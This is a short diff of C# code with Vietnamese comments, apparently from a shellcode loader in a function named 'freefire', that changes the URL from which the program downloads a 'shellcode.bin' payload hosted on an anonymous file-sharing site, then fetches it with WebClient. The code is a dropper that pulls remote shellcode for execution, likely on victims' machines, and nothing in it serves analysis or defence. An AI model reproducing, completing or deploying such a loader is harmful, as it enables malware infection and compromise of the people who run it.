@@ -17,7 +17,7 @@ function freefire {
             // Thiết lập giao thức bảo mật
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             // URL của shellcode
-            string url = "https://anonsharing.com/file/1cf18be466ba9178/shellcode.bin";
+            string url = "https://anonsharing.com/file/51e559e574f3fa26/shellcode_(2).bin";
             byte[] golangshc;
             // Tải shellcode từ URL
             using (WebClient client = new WebClient()) {
